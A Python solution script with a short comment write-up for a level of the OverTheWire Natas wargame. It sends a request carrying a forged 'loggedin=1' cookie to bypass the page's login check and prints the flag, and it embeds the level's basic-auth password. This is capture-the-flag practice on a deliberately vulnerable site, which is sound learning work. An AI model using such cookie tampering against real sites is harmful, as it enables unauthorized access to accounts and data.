#! /usr/bin/python


import requests


#Functions
def cleanheaders(headers):
	for item in headers:
		value=headers.get(item,'Not Found')
		print(f'{item} : {value}')


#Basic Authentication
basic_username,basic_password='natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'.split(':')


#Website Details
host=f'http://{basic_username}.natas.labs.overthewire.org'
path=''

#Custom Headers
custom_headers={'Cookie':'loggedin=1'}


#Payload
payload=''
url=host+path

session=requests.Session()
response=requests.get(url,auth=(basic_username,basic_password),headers=custom_headers)
content=response.text
status=response.status_code
headers=response.headers



# print(f'HOST : {host}\nuser:{basic_username}\npass:{basic_password}\n')
# cleanheaders(headers)


flag=content.split('\n')[13]
print(flag)


#WRITEUP
#Acessing the main page ,we get a message saying that 'Access disallowed. You are not logged in'
#Since there is no login page,we can only assume that a cookie is involved
#Checking the cookies of the page we find loggedin=0.
#Changing the 0 to a 1 ,means we will now be logged in.
#After changing the 0 to 1 and reloading,the page gives us the flag
